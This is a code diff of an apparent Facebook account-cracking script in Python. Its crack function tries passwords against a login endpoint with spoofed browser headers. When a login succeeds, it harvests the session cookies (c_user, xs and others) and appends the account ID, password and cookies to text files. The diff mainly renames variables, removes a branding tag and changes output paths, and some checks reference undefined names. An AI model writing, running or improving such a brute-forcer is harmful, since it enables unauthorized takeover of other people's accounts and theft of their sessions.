@@ -223,20 +223,20 @@ def crack(uid, password_list, total_count):
            "upgrade-insecure-requests": "1",
            "user-agent": us,
            "viewport-width": "980"}           
-            respon = session.post(url,data=log_data,headers=headers,allow_redirects=False)
+            respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
             response = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
-                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    print('\033[1;92m [JARVIS-OK] '+user+' | '+pw+'')
+                    print('\033[1;92m [OK] '+user+' | '+pw+'')
                     print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                    open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
-                    open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pw+"\n")
+                    open("/sdcard/vvvvvvvv/cookies.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
+                    open("/sdcard/vvvvvvvv/uid.txt","a").write(user+"|"+pw+"\n")
                     oks.append(uid)
                     break
             elif 'checkpoint' in response:
